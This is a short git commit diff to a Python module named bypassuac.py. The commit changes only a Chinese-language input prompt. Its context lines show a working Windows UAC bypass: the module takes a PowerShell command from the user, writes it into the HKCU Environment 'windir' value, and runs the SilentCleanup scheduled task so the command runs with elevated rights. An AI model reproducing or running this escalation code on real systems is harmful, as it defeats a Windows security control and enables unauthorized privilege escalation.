1e989c72c438290e3458b4df0edc16e86e8a8e4c
Angel0329 <55348284+Angel0329@users.noreply.github.com>
2021-03-29 20:10:11 +0800

    Update bypassuac.py

--- source/functions/bypassuac.py
+++ source/functions/bypassuac.py
@@ -2,7 +2,7 @@ import os
 
 class bypassuac:
     def bypass():
-            order=input("輸入須繞越UAC指令(於powershell上的指令模式):")
+            order=input("輸入須繞越UAC的指令(於powershell上的指令模式):")
             command="'powershell "+order+";#'"
             os.system("powershell Set-ItemProperty -Path ""HKCU:\Environment"" -Name ""windir"" -Value "+command)
             os.system("schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I")
